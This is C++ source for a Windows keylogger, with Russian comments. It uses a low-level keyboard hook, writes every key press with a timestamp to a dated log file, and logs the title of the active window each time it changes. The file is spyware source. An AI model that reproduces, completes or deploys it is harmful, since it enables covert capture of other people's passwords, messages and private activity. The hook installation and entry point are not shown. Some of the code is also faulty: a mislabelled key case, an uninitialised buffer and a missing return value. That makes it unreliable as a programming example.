#include <Windows.h>
#include <time.h>
#include <iostream>
#include <fstream>

using namespace std;

// Функция обратного вызова. Срабатывает при нажатии
LRESULT __stdcall HookCallback(int nCode, WPARAM wParam, LPARAM lParam);

// Перехват вызова функций
HHOOK hook;

// Структура для определения кнопки
KBDLLHOOKSTRUCT kbStruct;

ofstream file;

// Получение настоящего времени
char *GetTime()
{
    time_t t = time(NULL);         // Время в секундах
    struct tm *tm = localtime(&t); // Преобразование числа в структуру tm
    static char dateTime[64];      // Время и дата
    strftime(dateTime, sizeof(dateTime), "%c", tm);
    return dateTime;
}

// Актуальный файл лог
char *GetLogFileName()
{
    const time_t tm = time(NULL);
    char buf[64];
    strftime(buf, sizeof(buf), "%d.%m.%Y", localtime(&tm));
    static char logName[128];
    strcpy(logName, "log");
    strcat(logName, buf);
    strcat(logName, ".txt");
    return logName;
}

void WriteKey(int key)
{
    switch (key)
    {
    case VK_BACK:
        file << "[BACKSPACE]" << GetTime();
        break;
    case VK_RETURN:
        file << "[ENTER]" << GetTime();
        break;
    case VK_SPACE:
        file << "[SPACE]" << GetTime();
        break;
    case VK_TAB:
        file << "[TAB]" << GetTime();
        break;
    case VK_SHIFT: case VK_LSHIFT: case VK_RSHIFT: 
        file << "[SHIFT]" << GetTime();
        break;
    case VK_CONTROL: case VK_LCONTROL: case VK_RCONTROL:
        file << "[CTRL]" << GetTime();
        break;
    case VK_ESCAPE:
        file << "[ESC]" << GetTime();
        break;
    case VK_END:
        file << "[END]" << GetTime();
        break;
    case VK_HOME:
        file << "[HOME]" << GetTime();
        break;
    case VK_UP:
        file << "[UP]" << GetTime();
        break;
    case VK_DOWN:
        file << "[DOWN]" << GetTime();
        break;
    case VK_LEFT:
        file << "[LEFT]" << GetTime();
        break;
    case VK_RIGHT:
        file << "[RIGHT]" << GetTime();
        break;
    case 190: case 110:
        file << "." << GetTime();
        break;
    case 189: case 109:
        file << "[RIGHT]" << GetTime();
        break;
    case 20:
        file << "[CAPS]" << GetTime();
        break;
    default: // TODO: проверка нажатия шифта с капсом
        file << key << GetTime();
        break;
    }
}

int Save(int key)
{
    if (key == 1 || key == 2)
    {
        return 0;
    }

    // Имя предыдущего окна
    wchar_t prevProgName[256];
    // Получение активного окна
    HWND hwnd = GetForegroundWindow();
    // id процесса
    DWORD pid;
    // Раскладка клавиатуры
    HKL kbLayout;
    // Открываем файл лога
    file.open(GetLogFileName(), ios::app | ios::out);
    // Если есть активное окно
    if (hwnd)
    {
        pid = GetWindowThreadProcessId(hwnd, NULL);
        kbLayout = GetKeyboardLayout(pid);

        // Заголовок окна
        wchar_t currProgName[256];
        GetWindowTextW(hwnd, currProgName, 256);

        // Сравниваем заголовки программ
        if (wcscmp(currProgName, prevProgName) != 0)
        {
            wcscpy(prevProgName, currProgName); // FIXME: возможно нужно поменять местами
            // Запись в файл информации о времени и имени новой программы
            file << "\n\n[Program: \"" << currProgName << "\" - " << GetTime() << "]\n";
        }
        // Запись клавиши при активном окне
        WriteKey(key);
    }
}